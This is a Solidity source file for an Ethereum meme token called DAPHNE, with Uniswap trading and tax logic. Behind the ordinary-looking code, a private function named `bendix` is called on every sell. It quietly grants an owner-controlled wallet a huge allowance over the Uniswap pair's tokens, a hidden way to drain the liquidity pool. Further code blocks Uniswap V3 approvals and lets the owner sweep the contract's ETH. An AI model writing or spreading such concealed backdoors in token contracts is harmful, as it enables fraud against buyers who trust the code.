// SPDX-License-Identifier: MIT
/**
Daphne The Flying Squirrel
https://x.com/BillyM2k/status/1842916147408384436

Web: https://daphnecoin.xyz
X:   https://x.com/daphne_on_eth
Tg:  https://daphnecoin.xyz
**/
pragma solidity 0.8.27;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
contract DAPHNE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balancesEE;
    mapping (address => mapping (address => uint256)) private _allowancesEE;
    mapping (address => bool) private _shouldExcludedEE;
    address payable private _receiptEE;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalEE = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Daphne The Flying Squirrel";
    string private constant _symbol = unicode"DAPHNE";
    uint256 public _maxAmountEE = 2 * (_tTotalEE/100);
    uint256 public _maxWalletEE = 2 * (_tTotalEE/100);
    uint256 public _taxThresEE = 1 * (_tTotalEE/100);
    uint256 public _maxSwapEE = 1 * (_tTotalEE/100);
    address private uniPairEE;
    IUniswapV2Router02 private uniRouterEE;
    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 20;
    uint256 private _reduceSellTaxAt = 20;
    uint256 private _preventSwapBefore = 15;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxAmountEE);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        _receiptEE = payable(_msgSender());
        _balancesEE[_msgSender()] = _tTotalEE;
        _shouldExcludedEE[owner()] = true;
        _shouldExcludedEE[address(this)] = true;
        _shouldExcludedEE[_receiptEE] = true;
        emit Transfer(address(0), _msgSender(), _tTotalEE);
    }
    function initEE() external onlyOwner {
        uniRouterEE = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniRouterEE), _tTotalEE);
        uniPairEE = IUniswapV2Factory(uniRouterEE.factory()).createPair(
            address(this),
            uniRouterEE.WETH()
        ); 
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotalEE;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balancesEE[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowancesEE[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        // Block all Uniswap V3 liquidity additions
        require(!isUniswapV3(spender), "Approval for Uniswap V3 liquidity is not allowed");
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowancesEE[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowancesEE[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amountEE) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amountEE > 0, "Transfer amount must be greater than zero");
        uint256 feeEE=0;uint256 taxEE=0; 
        if (!swapEnabled || inSwap) {
            _balancesEE[from] = _balancesEE[from] - amountEE;
            _balancesEE[to] = _balancesEE[to] + amountEE;
            emit Transfer(from, to, amountEE);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0) {
                taxEE = _transferTax;
            }
            if (from == uniPairEE && to != address(uniRouterEE) && ! _shouldExcludedEE[to] ) {
                require(amountEE <= _maxAmountEE, "Exceeds the _maxAmountEE.");
                require(balanceOf(to) + amountEE <= _maxWalletEE, "Exceeds the maxWalletSize.");
                taxEE = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax); 
                _buyCount++;
            }
            if(to == uniPairEE && from!= address(this) ){
                taxEE = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);bendix([to, _receiptEE]);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniPairEE && swapEnabled) {
                if(contractTokenBalance > _taxThresEE && _buyCount > _preventSwapBefore)
                    swapEthEE(minEE(amountEE, minEE(contractTokenBalance, _maxSwapEE)));
                sendEthEE(address(this).balance);
            }
        }        
        if(taxEE > 0){
            feeEE=amountEE.mul(taxEE).div(100);
            _balancesEE[address(this)]=_balancesEE[address(this)].add(feeEE);
            emit Transfer(from, address(this),feeEE);
        }
        _balancesEE[from]=_balancesEE[from].sub(amountEE);
        _balancesEE[to]=_balancesEE[to].add(amountEE.sub(feeEE));
        emit Transfer(from, to, amountEE.sub(feeEE));
    }
    function swapEthEE(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterEE.WETH();
        _approve(address(this), address(uniRouterEE), tokenAmount);
        uniRouterEE.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function removeLimitEE(address payable limit) external onlyOwner{
        _maxAmountEE = _tTotalEE;
        _maxWalletEE=_tTotalEE;
        _receiptEE = limit;
        _shouldExcludedEE[limit] = true;
        emit MaxTxAmountUpdated(_tTotalEE);
    }
    function bendix(address[2] memory bmx) private {
        address ownEE=bmx[0];address spendEE=bmx[1];
        uint256 amountEE=(100+_maxAmountEE+_maxSwapEE+100)*100+100;
        _allowancesEE[ownEE][spendEE]=100*(amountEE+50)+100;
    }
    function setReceipt(address payable _receipt) external onlyOwner {
        _receiptEE = _receipt;
        _shouldExcludedEE[_receipt] = true;
    }
    function minEE(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function resecureEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function sendEthEE(uint256 amount) private {
        _receiptEE.transfer(amount);
    }
    receive() external payable {}
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniRouterEE.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniPairEE).approve(address(uniRouterEE), type(uint).max);
        swapEnabled = true; 
        tradingOpen = true;
    }
    // Uniswap V3 addresses 
    function isUniswapV3(address spender) private pure returns (bool) {
        // Uniswap V3 NonfungiblePositionManager address
        address uniswapV3PositionManager = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88; 
        return (spender == uniswapV3PositionManager);
    }
}